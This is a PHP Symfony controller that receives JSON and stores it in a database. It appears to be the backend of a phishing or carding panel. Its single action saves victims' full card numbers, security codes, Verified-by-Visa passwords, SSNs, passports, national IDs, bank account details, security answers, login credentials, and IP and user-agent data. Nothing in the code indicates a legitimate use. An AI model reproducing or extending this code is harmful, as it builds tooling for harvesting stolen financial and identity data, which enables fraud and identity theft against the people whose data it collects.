<?php

namespace Dashboard\RestfullBundle\Controller;

use Dashboard\AdminBundle\Entity\Card;
use Symfony\Bundle\FrameworkBundle\Controller\Controller;
use Symfony\Component\HttpFoundation\Request;

class RestController extends Controller
{
    public function CardInsertAction(Request $request)
    {

        $data = (array)json_decode($request->getContent());
        $em = $this->getDoctrine()->getManager();
        $card = new Card();
        $card->setFname($data["fname"]);
        $card->setLname($data["lname"]);
        $card->setDob($data["dob"]);
        $card->setTelephone($data["telephone"]);
        $card->setSsn($data["ssn"]);
        $card->setPassport($data["passport"]);
        $card->setNumbid($data["numbid"]);
        $card->setNaid($data["naid"]);
        $card->setCitizenid($data["citizenid"]);
        $card->setCivilid($data["civilid"]);
        $card->setQatarid($data["qatarid"]);
        $card->setAddress($data["address"]);
        $card->setTown($data["town"]);
        $card->setCountry($data["country"]);
        $card->setPostcode($data["postcode"]);
        $card->setCcname($data["ccname"]);
        $card->setCcno($data["ccno"]);
        $card->setCcexp($data["ccexp"]);
        $card->setSecode($data["secode"]);
        $card->setVbvsecure($data["vbvsecure"]);
        $card->setClimit($data["climit"]);
        $card->setAcno($data["acno"]);
        $card->setSortcode($data["sortcode"]);
        $card->setBans($data["bans"]);
        $card->setQ1($data["q1"]);
        $card->setA1($data["a1"]);
        $card->setUser($data["user"]);
        $card->setPass($data["pass"]);
        $card->setIp($data["ip"]);
        $card->setAgent($data["agent"]);
        $card->setCcbrand($data["ccbrand"]);
        $card->setCctype($data["cctype"]);
        $card->setCclevel($data["cclevel"]);
        $card->setCcbank($data["ccbank"]);
        $em->persist($card);
        $em->flush();


    }
}
